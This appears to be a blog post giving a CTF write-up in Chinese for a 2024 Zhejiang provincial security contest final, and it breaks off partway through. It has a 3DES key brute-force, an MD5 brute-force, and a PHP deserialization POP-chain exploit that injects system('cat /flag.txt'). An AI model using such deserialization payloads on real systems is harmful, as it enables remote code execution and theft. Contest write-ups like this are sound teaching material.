<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="允许一切如其所是">
    <meta name="author" content="C3ngH">
    
    <title>
        
            2024浙江省赛决赛 全方向部分 WirteUp |
        
        C3ngH&#39;s B10g
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"c3ngh.top","root":"/","language":"zh-CN","path":"search.xml"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"C3ngH's B10g","author":"C3ngH","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","logo":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg","favicon":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/favicon.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","links":"/links"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"CTF Misc / A1natas Team / V＆N Team / More","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/zch050217","weixin":null,"qq":"./images/qqQRcode.jpg","weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"waline","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":"https://blog-waline-weld.vercel.app/","reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"links":[{"title":"A1natas's Teammates"},{"name":"Lunatic - Misc指路人@星盟安全团队","link":"https://goodlunatic.github.io/","description":"Mind and Hand :)","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/Lunatic.png"},{"name":"A1ic3 - Crypto@V&N","link":"https://a1ic3.cn/","description":"希望成为一个有趣的人","avatar":"https://www.a1ic3.cn/avatar.png"},{"name":"PangBai - Reverse@W&M","link":"https://pangbai.work/","description":"世上所有不利都是当事人无能所致","avatar":"http://pangbai.work/images/avatar.jpg"},{"name":"void2eye - Web@WpgSec狼组安全","link":"https://void2eye.fun/","description":"临渊羡鱼，不如退而结网。","avatar":"https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/808.png"},{"name":"carbofish - 全栈&运维&开发&安全@r3kapig","link":"https://carbo.ink/","description":"lfy,wcnm!","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/CarboFish.jpg"},{"name":"AsaL1n - Web@V&N","link":"https://asal1n.github.io/","description":"why we need that?","avatar":"https://asal1n.github.io/img/head.jpg"},{"name":"enllus1on - Pwn@Nu1L","link":"https://enllus1on.github.io/","description":"pwn for more","avatar":"https://enllus1on.github.io/images/kano.jpg"},{"name":"Straw - Reverse","link":"https://straw-233.github.io/","description":"午门痴","avatar":"https://straw-233.github.io/avatar/meinasi.png"},{"name":"CHHHCHHOH - Web","link":"https://chhhchhoh.cn/","description":"吃了乙酸的乙醇会不会梦到乙酸乙酯？","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/zyc.png"},{"name":"WoodWhale - 全栈@r3kapig","link":"https://woodwhale.cn/","description":"A happy woodwhale!","avatar":"https://www.woodwhale.cn/woodwhale.png"},{"name":"XunFlash - Reverse","link":"https://www.xunflash.top/","description":"你好","avatar":"https://www.xunflash.top/icon.png"},{"name":"huanghunr - Reverse","link":"https://blog.huanghunr.top","description":"喵喵喵?!还没想好","avatar":"https://huanghunr-blog.oss-cn-hangzhou.aliyuncs.com/tx%20%283%29.jpg"},{"name":"温婳霂 - Misc","link":"https://somokel.github.io","description":"春祺夏安，秋绥冬宁。","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/wenhuamu.jpg"},{"name":"MetaVi - Misc","link":"https://metaviii.github.io","description":"Add a touch of fantasy?","avatar":"https://s2.loli.net/2024/12/04/jJpynvQUCA3RlIG.jpg"},{"title":"V&N's Teammates"},{"name":"Aecous","link":"https://aecous.github.io/","description":"web✌","avatar":"https://aecous.github.io/images/me.png"},{"title":"Other CTFer"},{"name":"sheep","link":"https://s1nec-1o.github.io/","description":"努力学习的pwner(ROIS✌","avatar":"https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"},{"name":"LilRan","link":"https://blog.xinshi.fun/","description":"今日启程 无畏向前","avatar":"https://blog.xinshi.fun/assets/avatar.png"},{"name":"_sun_","link":"https://sun1028.top/","description":"我也不知道要啥描述","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/sun.jpg"},{"name":"G3rling","avatar":"https://g3rling.top/wp-content/uploads/2024/03/头像.jpg","description":"少说话，多做事","link":"https://g3rling.top/"},{"title":"战队"},{"name":"A1natas","link":"https://www.a1natas.com/","description":"ZJNU A1natas Group","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/A1natas.png"},{"name":"V&N","link":"https://vnteam.cn/","description":"V&N Union CTF Team","avatar":"https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/VN.png"}]},"version":"4.2.2"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                </a>
            
            <a class="site-name border-box" href="/">
               C3ngH&#39;s B10g
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                首页
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                归档
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                标签
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                分类
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/links">
                                
                                友链
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                            首页
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                            归档
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                            标签
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                            分类
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
                            
                            友链
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        2024浙江省赛决赛 全方向部分 WirteUp
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">C3ngH</span>
                                
                                    <span class="author-badge">Lv4</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2024-11-11 16:01:40</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Sat Jan 18 2025 03:44:03 GMT+0800">2025-01-18 03:44:03</span>
            </span>
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/WriteUp/">WriteUp</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Misc/">Misc</a></li>
                        
                    
                </ul>
            </span>
        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>7.7k 字</span>
            </span>
        
        
            <span class="meta-info-item post-min2read">
                <i class="icon fas fa-clock"></i>&nbsp;<span>43 分钟</span>
            </span>
        
        
            <span class="meta-info-item post-pv">
                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
            </span>
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <h1>第七届浙江省大学生网络与信息安全竞赛决赛 WirteUp By A1natas</h1>
<h3 id="题目附件">题目附件</h3>
<p>链接: <a class="link"   target="_blank" rel="noopener" href="https://pan.baidu.com/s/1AjtxVKSbWQjZRUXZg8d6Og?pwd=b8kf" >https://pan.baidu.com/s/1AjtxVKSbWQjZRUXZg8d6Og?pwd=b8kf<i class="fas fa-external-link-alt"></i></a> 提取码: b8kf</p>
<h3 id="签到">签到</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_cbc_decode</span>(<span class="params">key, iv, cipher_data</span>):</span><br><span class="line">    des = DES3.new(key, mode=DES3.MODE_CBC, IV=iv)</span><br><span class="line">    result = des.decrypt(cipher_data)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">lst = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    des_iv = <span class="string">b&quot;12345678&quot;</span></span><br><span class="line">    enc_hex = <span class="string">&quot;570fc2416dad7569c13356820ba67ba628c6a5fcbc73f1c8689612d23c3a779befeacf678f93ff5eb4b58dc09dcb9a89&quot;</span></span><br><span class="line">    enc_flag = <span class="built_in">bytes</span>.fromhex(enc_hex)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(lst, repeat=<span class="number">10</span>):</span><br><span class="line">        des_key = <span class="string">&#x27;&#x27;</span>.join(i)+<span class="string">&quot;000000&quot;</span></span><br><span class="line">        des_key = des_key.encode()</span><br><span class="line">        des_dec_data = des_cbc_decode(des_key, des_iv, enc_flag)</span><br><span class="line">        <span class="comment"># print(des_dec_data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;DASCTF&quot;</span> <span class="keyword">in</span> des_dec_data:</span><br><span class="line">            <span class="built_in">print</span>(des_dec_data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line">    <span class="comment"># b&#x27;DASCTF&#123;Cyber_Security_2024_N1SC_Fina1_JiaY0u&#125;\x03\x03\x03&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>DASCTF{Cyber_Security_2024_N1SC_Fina1_JiaY0u}</strong></p>
<h3 id="Web">Web</h3>
<h4 id="wucanrce">wucanrce</h4>
<p>无参数rce<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/E1vGFxM32Iczr8R.png"
                        alt="image-20241109094836198-17311334955575"
                 ><br>
得到flag</p>
<h4 id="unserialize">unserialize</h4>
<p>先审计，发现利用链子就是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA::__destruct()-&gt;AAA::__toString()-&gt;GGG::invoke()-&gt;EEE::get()</span><br></pre></td></tr></table></figure>
<p>md5比较写个脚本爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">t = <span class="string">&quot;666&quot;</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> chars <span class="keyword">in</span> itertools.product(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>,</span><br><span class="line">                                   repeat=length):</span><br><span class="line">        test_str = <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line">        hashed = md5(md5(test_str))</span><br><span class="line">        <span class="keyword">if</span> hashed.startswith(t):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found match: <span class="subst">&#123;test_str&#125;</span> with MD5 hash: <span class="subst">&#123;hashed&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># Found match: eS with MD5 hash: 666adf7e8db0edc039faffa03fdcccd7</span></span><br></pre></td></tr></table></figure>
<p>然后后面的数组的这个逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;d[<span class="variable language_">$this</span>-&gt;e]=<span class="number">1</span>; <span class="comment"># array(1) &#123;[0]=&gt;int(1)&#125;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;d[]=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nononononnnn!!!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>这里是试出来的，原本还想着用那个FFF递归把数组爆掉，发现想错了，只需要让数组插入1失败就行，直接赋值为NAN。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aear</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aear = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; aear; <span class="comment">#触发 toString   step1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; <span class="keyword">string</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();  <span class="comment"># 触发 invoke</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pop</span>; <span class="comment"># 私有属性，跟get和set有关。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123; <span class="comment"># pop就传一个数组。</span></span><br><span class="line">        <span class="variable language_">$this</span> -&gt; pop = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123; <span class="comment"># $value 就是$pop</span></span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$value</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DDD</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magazine</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$length</span> = @<span class="variable language_">$this</span> -&gt; bag -&gt; <span class="title function_ invoke__">add</span>();   <span class="comment"># step2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; magazine -&gt; tower)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;really??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EEE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>; <span class="comment"># 需要等于1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d[<span class="variable language_">$this</span>-&gt;e]=<span class="number">1</span>; <span class="comment"># array(1) &#123;[0]=&gt;int(1)&#125;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;d[]=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nononononnnn!!!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cookie</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; cookie;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123; <span class="comment">## step3</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hahahhhh&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;haha&quot;</span>], <span class="variable">$args</span>); <span class="comment"># 调用$this这个类的方法：$func.&quot;haha&quot;,参数是$args。递归会爆炸</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$green</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$book</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fff</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FFF</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$eee</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EEE</span>();</span><br><span class="line"><span class="variable">$eee</span>-&gt;d = NAN;</span><br><span class="line"><span class="variable">$eee</span>-&gt;e = NAN;</span><br><span class="line"><span class="variable">$eee</span>-&gt;f = <span class="string">&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$ggg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GGG</span>();</span><br><span class="line"><span class="variable">$ggg</span>-&gt;book = <span class="string">&quot;eS&quot;</span>;</span><br><span class="line"><span class="variable">$ggg</span>-&gt;green = <span class="variable">$eee</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$aaaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="variable">$aaaa</span>-&gt;<span class="keyword">string</span> = <span class="variable">$ggg</span>;</span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>(<span class="variable">$aaaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title 